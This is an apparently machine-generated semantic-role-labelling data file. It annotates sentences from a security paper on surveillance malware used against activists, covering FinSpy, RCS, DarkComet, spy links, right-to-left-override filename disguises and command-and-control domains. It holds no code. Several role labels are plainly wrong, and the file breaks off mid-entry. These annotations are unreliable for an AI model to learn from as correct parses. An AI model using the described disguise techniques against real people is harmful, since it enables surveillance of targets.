their IP address is revealed to the at-\ntacker.<fn>3</fn>  The attacker then discovers the victim\u2019s identity from\ntheir ISP": {"sends": {"ARG0": {"text": "The at- tacker"}, "V": {"text": "sends", "index": 3}, "ARG2": {"text": "the pseudonymous account/ to a webpage or an e - mail containing an embedded remote image"}, "ARG1": {"text": "a link"}, "ARGM-PRD": {"text": "using one of many freely - available services"}}, "containing": {"ARG0": {"text": "an e - mail"}, "V": {"text": "containing", "index": 17}, "ARG1": {"text": "an embedded remote image"}}, "embedded": {"V": {"text": "embedded", "index": 19}, "ARG1": {"text": "remote image"}}, "using": {"V": {"text": "using", "index": 23}, "ARG1": {"text": "one of many freely - available services"}}, "discovers": {"ARG0": {"text": "The attacker"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "discovers", "index": 35}, "ARG2": {"text": "the victim \u2019s"}, "ARG1": {"text": "identity from their ISP"}}}, "         Their filenames contained a Uni-\n    code right-to-left override (RLO) character, causing Windows\n    to render a filename such as gpj.1bajaR.exe instead as\n    exe.Rajab1.jpg": {"contained": {"ARG0": {"text": "Their filenames"}, "V": {"text": "contained", "index": 2}, "ARG1": {"text": "a Uni- code right - to - left override ( RLO ) character , causing Windows to render a filename such as gpj.1bajaR.exe instead as exe . Rajab1.jpg"}}, "left": {"ARG0": {"text": "a Uni-"}, "ARGM-MNR": {"text": "right - to"}, "V": {"text": "left", "index": 10}, "ARG1": {"text": "override ( RLO ) character"}}, "causing": {"V": {"text": "causing", "index": 17}, "ARG1": {"text": "Windows to render a filename such as gpj.1bajaR.exe instead as exe . Rajab1.jpg"}}, "render": {"ARG0": {"text": "Windows"}, "V": {"text": "render", "index": 20}, "ARG1": {"text": "a filename such as gpj.1bajaR.exe"}, "ARGM-ADV": {"text": "instead as exe"}}}, " In that latter case, the sample arrived via e-mail\nin a .rar attachment that contained an .scr file disguised\nas a Word document": {"arrived": {"ARGM-LOC": {"text": "In that latter case"}, "ARG1": {"text": "the sample"}, "V": {"text": "arrived", "index": 7}, "ARGM-MNR": {"text": "via e - mail/ in a .rar"}}, "contained": {"ARG0": {"text": "a .rar attachment"}, "R-ARG0": {"text": "that"}, "V": {"text": "contained", "index": 17}, "ARG1": {"text": "an .scr file disguised as a Word document"}}, "disguised": {"ARG1": {"text": "an .scr file"}, "V": {"text": "disguised", "index": 21}, "ARG2": {"text": "as a Word document"}}}, "\n   We found that FinSpy encrypts data using a custom imple-\nmentation of AES-256-CBC": {"found": {"ARG0": {"text": "We"}, "V": {"text": "found", "index": 1}, "ARG1": {"text": "that FinSpy encrypts data using a custom imple- mentation of AES-256-CBC"}}, "using": {"ARG0": {"text": "FinSpy encrypts data"}, "V": {"text": "using", "index": 6}, "ARG1": {"text": "a custom imple- mentation of AES-256-CBC"}}}, " On\nthe one hand, we have observed attacks using a wide range of\noff-the-shelf spyware, as well as publicly available third-party\nservices, like iplogger.org": {"have": {"V": {"text": "have", "index": 6}}, "observed": {"ARGM-DIS": {"text": "On the one hand"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 7}, "ARG1": {"text": "attacks using a wide range of off - the - shelf spyware , as well as publicly available third - party services , like iplogger.org"}}, "using": {"V": {"text": "using", "index": 9}, "ARG1": {"text": "a wide range of off - the - shelf spyware , as well as publicly available third - party services , like iplogger.org"}}}, "\n   The instance of Xtreme RAT sent to Author used\nowner.no-ip.biz for its C&C, one of the domains men-\ntioned in a report published by Norman about a year-long cam-\npaign of cyberattacks on Israeli and Palestinian targets carried\nout by a group that Norman was unable to identify <fn>[57]</fn> ": {"sent": {"ARG1": {"text": "Xtreme RAT"}, "V": {"text": "sent", "index": 5}, "ARG2": {"text": "to Author"}}, "used": {"ARG0": {"text": "The instance of Xtreme RAT sent to Author"}, "V": {"text": "used", "index": 8}, "ARG1": {"text": "owner.no-ip.biz"}, "ARG2": {"text": "for its C&C , one of the domains men- tioned in a report published by Norman about a year - long cam-/ by a group that Norman was unable to identify"}}, "tioned": {"ARG1": {"text": "the domains men-"}, "V": {"text": "tioned", "index": 19}, "ARGM-LOC": {"text": "in a report published by"}, "ARG2": {"text": "Norman about a year - long cam- paign of cyberattacks on Israeli and Palestinian targets carried out by a group that Norman was unable to identify"}}, "published": {"ARG1": {"text": "a report"}, "V": {"text": "published", "index": 23}, "ARG0": {"text": "by Norman about a year - long cam- paign of cyberattacks on Israeli and Palestinian targets carried out by a group that Norman was unable to identify"}}, "carried": {"ARG1": {"text": "cyberattacks on Israeli and Palestinian targets"}, "V": {"text": "carried", "index": 40}, "ARG0": {"text": "by a group that Norman was unable to identify"}}, "was": {"ARG1": {"text": "Norman"}, "V": {"text": "was", "index": 47}, "ARG2": {"text": "unable to identify"}}, "identify": {"ARG1": {"text": "a group"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "Norman"}, "V": {"text": "identify", "index": 50}}}, " The\n    second involved specially crafted IP spy links and e-mails de-\n    signed to reveal the IP addresses of operators of pseudonymous\n    accounts": {"involved": {"ARGM-TMP": {"text": "second"}, "V": {"text": "involved", "index": 2}}, "crafted": {"ARGM-ADV": {"text": "specially"}, "V": {"text": "crafted", "index": 4}, "ARG1": {"text": "IP spy"}}, "signed": {"ARGM-ADV": {"text": "specially"}, "V": {"text": "signed", "index": 13}, "ARG1": {"text": "to reveal the IP addresses of operators of pseudonymous accounts"}}, "reveal": {"ARG0": {"text": "IP spy links and e - mails"}, "V": {"text": "reveal", "index": 15}, "ARG1": {"text": "the IP addresses of operators of pseudonymous accounts"}}}, " Ahmed subsequently noted several suspicious ac-\ncesses to his GMail account using IMAP": {"noted": {"ARG0": {"text": "Ahmed"}, "ARGM-TMP": {"text": "subsequently"}, "V": {"text": "noted", "index": 2}, "ARG1": {"text": "several suspicious ac- cesses to his GMail account using IMAP"}}, "using": {"ARG0": {"text": "several suspicious ac- cesses"}, "V": {"text": "using", "index": 11}, "ARG1": {"text": "IMAP"}}}, " We also found two groups\nthat forwarded to the same address": {"found": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "found", "index": 2}, "ARG1": {"text": "two groups that forwarded to the same address"}}, "forwarded": {"ARG0": {"text": "two groups"}, "R-ARG0": {"text": "that"}, "V": {"text": "forwarded", "index": 6}, "ARG1": {"text": "to the same address"}}}, "\n   Use of embedded remote images: We identified several\ntargets who received spoofed e-mails containing embedded\nremote images": {"identified": {"ARGM-PRD": {"text": "Use of embedded remote images"}, "ARG0": {"text": "We"}, "V": {"text": "identified", "index": 7}, "ARG1": {"text": "several targets who received spoofed e - mails containing embedded remote images"}}, "received": {"ARG0": {"text": "several targets"}, "R-ARG0": {"text": "who"}, "V": {"text": "received", "index": 11}, "ARG1": {"text": "spoofed e - mails containing embedded remote images"}}, "spoofed": {"ARG0": {"text": "who"}, "V": {"text": "spoofed", "index": 12}, "ARG1": {"text": "e - mails containing embedded remote images"}}, "containing": {"ARG0": {"text": "e - mails"}, "V": {"text": "containing", "index": 16}, "ARG1": {"text": "embedded remote images"}}, "embedded": {"ARG2": {"text": "e - mails containing"}, "V": {"text": "embedded", "index": 17}, "ARG1": {"text": "remote images"}}}, "\n   Gamma documentation advertises that an operator of FinSpy\ncan obscure the location of the C&C server (called the mas-\nter) by setting up a proxy known as a relay": {"advertises": {"ARG0": {"text": "Gamma documentation"}, "V": {"text": "advertises", "index": 2}, "ARG1": {"text": "that an operator of FinSpy can obscure the location of the C&C server ( called the mas- ter ) by setting up a proxy known as a relay"}}, "can": {"V": {"text": "can", "index": 8}}, "obscure": {"ARG0": {"text": "an operator of FinSpy"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "obscure", "index": 9}, "ARG1": {"text": "the location of the C&C server ( called the mas- ter ) by setting up a proxy"}, "ARGM-MNR": {"text": "known as a relay"}}, "called": {"ARGM-MOD": {"text": "can"}, "V": {"text": "called", "index": 17}, "ARG2": {"text": "the mas- ter )"}, "ARGM-MNR": {"text": "by setting up a proxy known as a relay"}}, "setting": {"ARG0": {"text": "an operator of FinSpy"}, "V": {"text": "setting", "index": 23}, "ARG1": {"text": "a proxy known as a relay"}}, "known": {"ARG1": {"text": "a proxy"}, "V": {"text": "known", "index": 27}, "ARG2": {"text": "as a relay"}}}, "\n   Two weeks after this correspondence with Ahmed, one of us\n(Author in Figure 5) received a targeted e-mail with a link to\na file hosted on Google Docs containing a commercial off-the-\n\nshelf RAT, Xtreme RAT": {"received": {"ARGM-TMP": {"text": "Two weeks after this correspondence with Ahmed"}, "ARG0": {"text": "one of us ( Author in Figure 5 )"}, "V": {"text": "received", "index": 17}, "ARG1": {"text": "a targeted e - mail with a link to a file hosted on Google Docs containing a commercial off - the- shelf RAT , Xtreme RAT"}}, "hosted": {"ARG1": {"text": "a file"}, "V": {"text": "hosted", "index": 29}, "ARGM-LOC": {"text": "on Google Docs containing a commercial off - the- shelf RAT"}}, "containing": {"ARG0": {"text": "Google Docs"}, "V": {"text": "containing", "index": 33}, "ARG1": {"text": "a commercial off - the- shelf RAT , Xtreme RAT"}}}, " The document used the\n same exploit and attempted to download a second stage from\n rcs-demo.hackingteam.it, which was unavailable at\n the time of testing": {"used": {"ARG0": {"text": "The document"}, "V": {"text": "used", "index": 2}, "ARG1": {"text": "the same exploit and attempted"}, "ARG2": {"text": "to download a second stage from rcs-demo.hackingteam.it , which was unavailable at the time of testing"}}, "attempted": {"ARG0": {"text": "The document"}, "V": {"text": "attempted", "index": 7}, "ARG1": {"text": "to download a second stage from rcs-demo.hackingteam.it , which was unavailable at the time of testing"}}, "download": {"ARG0": {"text": "The document"}, "V": {"text": "download", "index": 9}, "ARG1": {"text": "a second stage from rcs-demo.hackingteam.it , which was unavailable at the time of testing"}}, "was": {"ARG1": {"text": "rcs-demo.hackingteam.it"}, "R-ARG1": {"text": "which"}, "V": {"text": "was", "index": 17}, "ARG2": {"text": "unavailable"}, "ARGM-TMP": {"text": "at the time of testing"}}}, " These attacks share the same\nC&C, 216.6.0.28, a Syrian IP address belonging to the Syr-\nian Telecommunications Establishment, and publicly reported\nas a C&C of Syrian malware since February 2012 <fn>[45]</fn> ": {"share": {"ARG0": {"text": "These attacks"}, "V": {"text": "share", "index": 2}, "ARG1": {"text": "the same C&C , 216.6.0.28 , a Syrian IP address belonging to the Syr- ian Telecommunications Establishment ,"}}, "belonging": {"ARG0": {"text": "a Syrian IP address"}, "V": {"text": "belonging", "index": 13}, "ARG1": {"text": "to the Syr- ian Telecommunications Establishment"}}, "reported": {"ARGM-MNR": {"text": "publicly"}, "V": {"text": "reported", "index": 23}, "ARG1": {"text": "as a C&C of Syrian malware"}, "ARGM-TMP": {"text": "since February 2012"}}}, "\n       The first involved malicious e-mails containing FinSpy, a\n    \u201clawful intercept\u201d trojan sold exclusively to governments": {"involved": {"ARGM-TMP": {"text": "first"}, "V": {"text": "involved", "index": 2}, "ARG1": {"text": "malicious e - mails containing FinSpy"}}, "containing": {"ARG0": {"text": "e - mails"}, "V": {"text": "containing", "index": 7}, "ARG1": {"text": "FinSpy"}}, "sold": {"ARG1": {"text": "a \u201c lawful intercept \u201d trojan"}, "V": {"text": "sold", "index": 16}, "ARGM-MNR": {"text": "exclusively"}, "ARG2": {"text": "to governments"}}}, " Even after he changed\nhis password, the accesses continued": {"changed": {"ARG0": {"text": "he"}, "V": {"text": "changed", "index": 3}, "ARG1": {"text": "his password"}}, "continued": {"ARGM-TMP": {"text": "Even after he changed his password"}, "ARG1": {"text": "the accesses"}, "V": {"text": "continued", "index": 9}}}, "\n       The other .rar files contained a Word document with an\n    embedded ASCII-encoded PE file containing a custom macro\n    set to automatically run upon document startup": {"contained": {"ARG0": {"text": "The other .rar files"}, "V": {"text": "contained", "index": 4}, "ARG1": {"text": "a Word document with an embedded ASCII - encoded PE file containing a custom macro set to automatically run upon document startup"}}, "embedded": {"V": {"text": "embedded", "index": 10}, "ARG2": {"text": "ASCII - encoded PE"}}, "encoded": {"V": {"text": "encoded", "index": 13}, "ARG1": {"text": "PE file"}}, "containing": {"ARG0": {"text": "an embedded ASCII - encoded PE file"}, "V": {"text": "containing", "index": 16}, "ARG1": {"text": "a custom macro set to automatically run upon document startup"}}, "set": {"ARG1": {"text": "a custom macro"}, "V": {"text": "set", "index": 20}, "ARG2": {"text": "to automatically run"}}, "run": {"ARGM-MNR": {"text": "automatically"}, "V": {"text": "run", "index": 23}, "ARG1": {"text": "upon document startup"}}}, "\n    The attacks, while sometimes incorporating effective so-\ncial engineering, in general lack novel technical elements": {"incorporating": {"ARG0": {"text": "The attacks"}, "ARGM-TMP": {"text": "sometimes"}, "V": {"text": "incorporating", "index": 5}, "ARG1": {"text": "effective so- cial engineering"}, "ARGM-LOC": {"text": "in general lack novel technical elements"}}}, " .\u201d The page redirected to a YouTube\nvideo a few seconds later, but first loaded a Java exploit <fn>[64]</fn> \u2014a\n\n<footer>USENIX Association \t                                                                                 23rd USENIX Security Symposium\u2003 519</footer>\n\fknown vulnerability with no patch at the time that the e-mails\nwere sent": {"redirected": {"ARG0": {"text": "The page"}, "V": {"text": "redirected", "index": 4}, "ARG2": {"text": "to a YouTube video"}, "ARGM-TMP": {"text": "a few seconds later"}}, "loaded": {"ARG0": {"text": "\u201d The page redirected"}, "ARGM-TMP": {"text": "first/ at the time"}, "V": {"text": "loaded", "index": 16}, "ARG2": {"text": "a Java exploit known vulnerability"}, "ARG1": {"text": "with no patch/ that the e - mails were sent"}}, "known": {"ARGM-MNR": {"text": "Java"}, "V": {"text": "known", "index": 20}, "ARG1": {"text": "vulnerability"}}, "were": {"V": {"text": "were", "index": 33}}, "sent": {"ARG1": {"text": "the e - mails"}, "V": {"text": "sent", "index": 34}}}, "\n</footnote>\nrevolved around Tweets that referred to Bahrain\u2019s King as a\n\u201ccursed one.\u201d Red Sky had earlier targeted other users with IP\nspy links shortened using the al9mood bit.ly account": {"revolved": {"V": {"text": "revolved", "index": 0}, "ARGM-LOC": {"text": "around"}, "ARG1": {"text": "Tweets that referred to Bahrain \u2019s King as a \u201c cursed one"}}, "referred": {"ARG0": {"text": "Tweets"}, "R-ARG0": {"text": "that"}, "V": {"text": "referred", "index": 4}, "ARG1": {"text": "to Bahrain \u2019s King"}, "ARG2": {"text": "as a \u201c cursed one"}}, "had": {"V": {"text": "had", "index": 18}}, "targeted": {"ARG0": {"text": "Red Sky"}, "ARGM-TMP": {"text": "earlier"}, "V": {"text": "targeted", "index": 20}, "ARG1": {"text": "other users"}, "ARGM-MNR": {"text": "with IP spy links shortened"}, "ARGM-ADV": {"text": "using the al9mood bit.ly"}}, "shortened": {"ARG1": {"text": "IP spy links"}, "V": {"text": "shortened", "index": 27}, "ARGM-MNR": {"text": "using the al9mood bit.ly account"}}, "using": {"V": {"text": "using", "index": 28}, "ARG1": {"text": "the al9mood bit.ly account"}}}, " We located a version of FinSpy that does not\nuse the normal FinSpy handshake, but instead uses a protocol\nbased on HTTP POST requests for communication with the\nC&C server": {"located": {"ARG0": {"text": "We"}, "V": {"text": "located", "index": 1}, "ARG1": {"text": "a version of FinSpy that does not use the normal FinSpy handshake"}}, "does": {"V": {"text": "does", "index": 7}}, "use": {"ARG0": {"text": "FinSpy"}, "R-ARG0": {"text": "that"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "use", "index": 9}, "ARG1": {"text": "the normal FinSpy handshake"}}, "uses": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "instead"}, "V": {"text": "uses", "index": 17}, "ARG1": {"text": "a protocol"}, "ARG2": {"text": "based on HTTP POST requests for communication with the C&C server"}}, "based": {"ARG1": {"text": "a protocol"}, "V": {"text": "based", "index": 20}, "ARG2": {"text": "on HTTP POST requests for communication with the C&C server"}}}, " The attack downloaded an instance of\nSpyNet from isteeler.com (which from our inspection did\nnot appear to have any legitimate content), which used the\nC&C storge.myftp.org": {"downloaded": {"ARG0": {"text": "The attack"}, "V": {"text": "downloaded", "index": 2}, "ARG1": {"text": "an instance of SpyNet from isteeler.com ( which from our inspection did not appear to have any legitimate content ) , which used the C&C storge.myftp.org"}}, "did": {"V": {"text": "did", "index": 14}}, "appear": {"ARG1": {"text": "which/ from our inspection"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "appear", "index": 16}, "C-ARG1": {"text": "to have any legitimate content )"}}, "have": {"ARG0": {"text": "which/ from our inspection"}, "V": {"text": "have", "index": 18}, "ARG1": {"text": "any legitimate content )"}, "ARGM-ADV": {"text": "which used the C&C storge.myftp.org"}}, "used": {"ARG0": {"text": "any legitimate content )"}, "R-ARG0": {"text": "which"}, "V": {"text": "used", "index": 25}, "ARG1": {"text": "the C&C storge.myftp.org"}}}, " @YLUBH received at\nleast three IP spy links in late 2012, sent via public Twitter mes\nsages": {"received": {"ARG0": {"text": "@YLUBH"}, "V": {"text": "received", "index": 1}, "ARG1": {"text": "at least three IP spy links"}, "ARGM-TMP": {"text": "in late 2012"}}, "sent": {"V": {"text": "sent", "index": 12}, "ARGM-MNR": {"text": "via public"}, "ARG2": {"text": "Twitter mes sages"}}}, " The spyware period-\nically probes this folder for files that match a certain naming\nconvention, then sends them to the C&C server": {"probes": {"ARG0": {"text": "The spyware"}, "ARGM-TMP": {"text": "period-"}, "ARGM-MNR": {"text": "ically"}, "V": {"text": "probes", "index": 4}, "ARG1": {"text": "this folder for files that match a certain naming convention"}}, "match": {"ARG0": {"text": "files"}, "R-ARG0": {"text": "that"}, "V": {"text": "match", "index": 10}, "ARG1": {"text": "a certain naming convention"}}, "sends": {"ARG0": {"text": "The spyware period- ically"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "sends", "index": 17}, "ARG1": {"text": "them"}, "ARG2": {"text": "to the C&C server"}}}, " The .scr file was a self-extracting\narchive that decompressed and ran both the bait document\nand the payload": {"was": {"ARG1": {"text": "The .scr file"}, "V": {"text": "was", "index": 3}, "ARG2": {"text": "a self - extracting archive that decompressed and ran both the bait document and the payload"}}, "extracting": {"ARG0": {"text": "self"}, "V": {"text": "extracting", "index": 7}, "ARG1": {"text": "archive"}}, "decompressed": {"ARG1": {"text": "a self - extracting archive"}, "R-ARG1": {"text": "that"}, "V": {"text": "decompressed", "index": 10}}, "ran": {"R-ARG0": {"text": "that"}, "ARG0": {"text": "decompressed"}, "V": {"text": "ran", "index": 12}, "ARG1": {"text": "both the bait document and the payload"}}}, " While dis-\ntracted by this meaningless interaction, the victim\u2019s machine is\ninfected with DarkComet 3.3 [<fn>32</fn>, <fn>33</fn>] ": {"tracted": {"ARG1": {"text": "dis-"}, "V": {"text": "tracted", "index": 2}, "ARG0": {"text": "by this meaningless interaction"}}, "is": {"V": {"text": "is", "index": 12}}, "infected": {"ARGM-TMP": {"text": "While dis- tracted by this meaningless interaction/ 3.3 [ ]"}, "ARG1": {"text": "the victim \u2019s machine"}, "V": {"text": "infected", "index": 13}, "ARG2": {"text": "with DarkComet"}}}, " The\nfirst bait file presents to the victim as a PDF containing infor-\nmation about a planned uprising in Aleppo": {"containing": {"ARG0": {"text": "a PDF"}, "V": {"text": "containing", "index": 11}, "ARG1": {"text": "infor- mation about a planned uprising in Aleppo"}}, "planned": {"V": {"text": "planned", "index": 16}, "ARG1": {"text": "uprising"}}}, "\n    For seeding, the attackers typically use compromised ac-\ncounts (including those of arrested individuals) or fake iden-\ntities masquerading as pro-opposition": {"seeding": {"V": {"text": "seeding", "index": 1}}, "use": {"ARGM-ADV": {"text": "For seeding/ typically"}, "ARG0": {"text": "the attackers"}, "V": {"text": "use", "index": 6}, "ARG1": {"text": "compromised ac- counts ("}}, "compromised": {"V": {"text": "compromised", "index": 7}}, "including": {"ARG2": {"text": "compromised"}, "V": {"text": "including", "index": 11}, "ARG1": {"text": "those of arrested individuals ) or fake iden- tities masquerading as pro - opposition"}}, "arrested": {"V": {"text": "arrested", "index": 14}, "ARG1": {"text": "individuals"}}, "masquerading": {"ARG0": {"text": "those of arrested individuals ) or fake iden- tities"}, "V": {"text": "masquerading", "index": 21}, "ARG1": {"text": "as pro - opposition"}}}, " Attackers often used (1) accounts of promi-\nnent or trusted but jailed individuals like \u201cRed Sky,\u201d (2) fake\npersonas (e.g., attractive women or fake job seekers when tar-\ngeting a labor union), or (3) impersonations of legitimate ac-\ncounts": {"used": {"ARG0": {"text": "Attackers"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "used", "index": 2}, "ARG1": {"text": "( 1 ) accounts of promi- nent or trusted"}}, "trusted": {"ARGM-TMP": {"text": "often"}, "V": {"text": "trusted", "index": 11}}, "jailed": {"ARG0": {"text": "Attackers"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "jailed", "index": 13}, "ARG1": {"text": "individuals"}, "ARGM-MNR": {"text": "like \u201c Red Sky"}}, "geting": {"ARGM-TMP": {"text": "when"}, "V": {"text": "geting", "index": 37}, "ARG1": {"text": "a labor union )"}}}, " This sample of SpyNet\ncommunicated with the same C&C hamas.sytes.net": {"communicated": {"ARG0": {"text": "This sample of SpyNet"}, "V": {"text": "communicated", "index": 4}, "ARG2": {"text": "with the same C&C hamas.sytes.net"}}}, " In all, these totaled 17 distinct\nhashes of documents, and 10 distinct hashes of payloads (some\ndocuments that differed in their hash downloaded the same pay-\nload)": {"totaled": {"ARGM-DIS": {"text": "In all"}, "ARG1": {"text": "these"}, "V": {"text": "totaled", "index": 4}, "ARG2": {"text": "17 distinct hashes of documents"}}, "differed": {"ARG1": {"text": "some documents"}, "R-ARG1": {"text": "that"}, "V": {"text": "differed", "index": 21}, "ARGM-LOC": {"text": "in their hash downloaded"}}, "downloaded": {"V": {"text": "downloaded", "index": 25}, "ARG1": {"text": "the same pay- load )"}}}, "\nThe exploit loaded shellcode that downloaded a second stage\n<figure>\n         UAE Gov't         HackingTeam            3-Stage\n                                               Exploit Kit\n                                                                 owner.no-ip.biz\n                   CVE-2010-3333\n                                         \u201cwikileaks\u201d         Xtreme RAT\n                   RCS                 \u201cveryimportant\u201d\n                                 Author\n          ar-24.com                                Communicated\n                                                     via E-Mail\n         Ahmed\n                       Laptop\n                      infected\n                                        E-Mail account\n                                        compromised\n                                        </figure>\n                                        <caption>\n Figure 5: Part of the ecosystem of UAE surveillance at-\n tacks.</caption>\n from ar-24.com, which in turn downloaded spyware from\n ar-24.com": {"loaded": {"ARG0": {"text": "The exploit"}, "V": {"text": "loaded", "index": 2}, "ARG1": {"text": "shellcode that downloaded a second stage from ar-24.com , which in turn downloaded spyware from ar-24.com"}}, "downloaded": {"V": {"text": "downloaded", "index": 5}, "ARG1": {"text": "a second stage from ar-24.com , which in turn downloaded spyware from ar-24.com"}}, "downloaded_2": {"ARG0": {"text": "ar-24.com"}, "R-ARG0": {"text": "which"}, "ARGM-DIS": {"text": "in turn"}, "V": {"text": "downloaded", "index": 15}, "ARG1": {"text": "spyware"}, "ARG2": {"text": "from ar-24.com"}}}, "\n    The C&C server also ran on ar-24.com": {"ran": {"ARG0": {"text": "The C&C server"}, "ARGM-DIS": {"text": "also"}, "V": {"text": "ran", "index": 4}, "ARG1": {"text": "on ar-24.com"}}}, " In fact the file is a\nWindows Screensaver (.scr) that masquerades as a PDF using\nUnicode RLO, rendering a name such as \u201c.fdp.scr\u201d dis-\nplay to the victim as \u201c.rcs.pdf.\u201d The second bait file is\na dummy program containing DarkComet while masquerading\nas a Skype call encryption program, playing to opposition para-\nnoia about government backdoors in common software": {"is": {"ARGM-DIS": {"text": "In fact"}, "ARG1": {"text": "the file"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "a Windows Screensaver ( .scr ) that masquerades as a PDF using Unicode RLO , rendering a name such as \u201c .fdp.scr \u201d dis- play to the victim as \u201c .rcs.pdf"}}, "masquerades": {"ARG0": {"text": "a Windows Screensaver ( .scr )"}, "R-ARG0": {"text": "that"}, "V": {"text": "masquerades", "index": 12}, "ARGM-PRP": {"text": "as a PDF"}, "ARGM-MNR": {"text": "using Unicode RLO"}}, "using": {"ARG0": {"text": "a PDF"}, "V": {"text": "using", "index": 16}, "ARG1": {"text": "Unicode RLO"}}, "rendering": {"ARG0": {"text": "masquerades as a PDF using Unicode RLO"}, "V": {"text": "rendering", "index": 20}, "ARG2": {"text": "a name such as \u201c .fdp.scr \u201d dis- play to the victim as \u201c .rcs.pdf"}}, "is_2": {"ARG1": {"text": "The second bait file"}, "V": {"text": "is", "index": 42}, "ARG2": {"text": "a dummy program containing DarkComet while masquerading as a Skype call encryption program , playing to opposition para- noia about government backdoors in common software"}}, "containing": {"ARG0": {"text": "a dummy program"}, "V": {"text": "containing", "index": 46}, "ARG1": {"text": "DarkComet"}, "ARGM-TMP": {"text": "while masquerading as a Skype call encryption program"}}, "masquerading": {"V": {"text": "masquerading", "index": 49}, "ARG1": {"text": "as a Skype call encryption program"}}, "playing": {"V": {"text": "playing", "index": 57}, "ARG4": {"text": "to opposition para- noia"}}}, " Yet, the attacks are\nnoteworthy for their careful social engineering, their links to\ngovernments, and their real-world impact": {"are": {"ARGM-DIS": {"text": "Yet"}, "ARG1": {"text": "the attacks"}, "V": {"text": "are", "index": 4}, "ARG2": {"text": "noteworthy"}, "ARGM-PRD": {"text": "for their careful social engineering , their links to governments , and their real - world impact"}}}, " The SpyNet sample communicated\nwith the C&C hamas.sytes.net": {"communicated": {"ARG0": {"text": "The SpyNet sample"}, "V": {"text": "communicated", "index": 3}, "ARG2": {"text": "with the C&C hamas.sytes.net"}}}, " These techniques often limit\nthe world-visibility of malicious files and links, slowing their\ndetection by common AV products": {"limit": {"ARG0": {"text": "These techniques"}, "ARGM-TMP": {"text": "often"}, "V": {"text": "limit", "index": 3}, "ARG1": {"text": "the world - visibility of malicious files and links"}, "ARGM-ADV": {"text": "slowing their detection by common AV products"}}, "slowing": {"ARG0": {"text": "These techniques"}, "V": {"text": "slowing", "index": 14}, "ARG1": {"text": "their detection"}, "ARGM-MNR": {"text": "by common AV products"}}}, " We also saw instances\n of the 3-Stage Exploit Kit where the first stage contained a\n Flash exploit; in some cases, we could obtain all stages and\n confirm that these installed RCS": {"saw": {"ARG0": {"text": "We"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "saw", "index": 2}, "ARG1": {"text": "instances of the 3-Stage Exploit Kit where the first stage contained a Flash exploit"}}, "contained": {"ARGM-LOC": {"text": "the Exploit Kit"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the first stage"}, "V": {"text": "contained", "index": 13}, "ARG1": {"text": "a Flash exploit"}}, "could": {"V": {"text": "could", "index": 23}}, "obtain": {"ARGM-LOC": {"text": "in some cases"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "obtain", "index": 24}, "ARG1": {"text": "all stages"}}, "confirm": {"ARGM-LOC": {"text": "in some cases"}, "ARG0": {"text": "we"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "confirm", "index": 28}, "ARG1": {"text": "that these installed RCS"}}, "installed": {"ARG0": {"text": "these"}, "V": {"text": "installed", "index": 31}, "ARG1": {"text": "RCS"}}}, " Two RCS and 5 FSBSpy samples from VirusTo-\ntal communicated with various servers in the group": {"communicated": {"ARG1": {"text": "Two RCS and 5 FSBSpy samples from VirusTo- tal"}, "V": {"text": "communicated", "index": 9}, "ARG2": {"text": "with various servers"}, "ARGM-LOC": {"text": "in the group"}}}, " In general, the attacks we find are not well-\ndetected by anti-virus programs": {"find": {"ARG1": {"text": "the attacks"}, "ARG0": {"text": "we"}, "V": {"text": "find", "index": 6}}, "are": {"V": {"text": "are", "index": 7}}, "detected": {"ARGM-ADV": {"text": "In general"}, "ARG1": {"text": "the attacks we find"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "detected", "index": 10}, "ARG0": {"text": "by anti - virus programs"}}}, " Both attacks resulted in an Xtreme RAT infection": {"resulted": {"ARG1": {"text": "Both attacks"}, "V": {"text": "resulted", "index": 2}, "ARG2": {"text": "in an Xtreme RAT infection"}}}, " We then infected the\nVM with FinSpy and allowed it to connect to the Bahrain C&C\nserver": {"infected": {"ARG0": {"text": "We"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "infected", "index": 2}, "ARG1": {"text": "the VM"}, "ARG2": {"text": "with FinSpy"}}, "allowed": {"ARG0": {"text": "We"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "allowed", "index": 8}, "ARG1": {"text": "it to connect to the Bahrain C&C server"}}, "connect": {"ARG0": {"text": "it"}, "V": {"text": "connect", "index": 11}, "ARG1": {"text": "to the Bahrain C&C server"}}}, "\n   Two of the other CVE-2012-0158 exploits down-\nloaded DarkComet from www.getmedia.us and\nwww.technopenta.com after posting system infor-\nmation to random123.site11.com": {"loaded": {"ARG2": {"text": "Two of the other CVE-2012 - 0158 exploits"}, "V": {"text": "loaded", "index": 9}, "ARG1": {"text": "DarkComet from www.getmedia.us and www.technopenta.com"}, "ARGM-TMP": {"text": "after posting system infor- mation to random123.site11.com"}}, "posting": {"V": {"text": "posting", "index": 16}, "ARG1": {"text": "system infor- mation to random123.site11.com"}}}, " On the other hand, some at-\ntacks use so-called \u201clawful intercept\u201d trojans and related equip-\n<footnote>\n   1 Dates   in the paper are given MM/DD/YY": {"use": {"ARG0": {"text": "some at- tacks"}, "V": {"text": "use", "index": 8}, "ARG1": {"text": "so - called \u201c lawful intercept \u201d trojans and related equip- 1"}}, "called": {"V": {"text": "called", "index": 11}, "ARG2": {"text": "\u201c"}}, "are": {"V": {"text": "are", "index": 25}}, "given": {"ARGM-DIS": {"text": "On the other hand"}, "ARG1": {"text": "some at- tacks use so - called \u201c lawful intercept \u201d trojans and related equip- 1 Dates in the paper"}, "V": {"text": "given", "index": 26}, "ARG2": {"text": "MM / DD / YY"}}}, "\nThis executable contained a similar string, except it identi-\nfied itself as FinSpy v3.00, and attempted to connect to\ntiger.gamma-international.de, a domain registered\nto Gamma International GmbH": {"contained": {"ARG0": {"text": "This 